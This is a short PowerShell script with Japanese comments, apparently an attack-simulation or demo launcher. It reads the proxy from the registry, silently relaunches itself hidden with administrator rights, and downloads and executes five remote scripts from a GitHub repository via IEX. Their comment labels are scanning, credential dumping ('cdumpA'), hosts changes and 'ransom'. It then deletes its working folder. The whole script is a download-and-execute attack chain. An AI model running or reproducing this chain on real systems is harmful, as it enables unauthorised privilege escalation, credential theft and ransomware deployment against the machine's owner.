#手動プロキシが設定されているかどうかを確認
if ((Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("ProxyEnable") -eq 1)
{
    $proxy_url = "http://" + (Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("ProxyServer") #プロキシをアドレスで指定
}
else
{
    $wsobj = new-object -comobject wscript.shell
    $result = $wsobj.popup("手動プロキシセットアップが設定されていません")
    exit
}


#プロキシの参照がうまくいかない場合はIfElseを削除して明示的に指定
#$proxy_url= 'http://13.231.199.128:3128'

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }
set-Content C:\CRDemo\proxy.txt $proxy_url
$web_client = New-Object System.Net.WebClient; $proxy_server = New-Object System.Net.WebProxy($proxy_url, $true); $web_client.Proxy = $proxy_server

#7zip
IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/unzip_124509pr.ps1')

#scanning
IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/scan_124509pr.ps1') 

#cdumpA
IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/cdumpa_124509pr.ps1')

#hosts
IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/hosts_124509pr.ps1')

#ransom
IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/ransom_124509.ps1')

Remove-Item C:\CRDemo -Recurse -Force
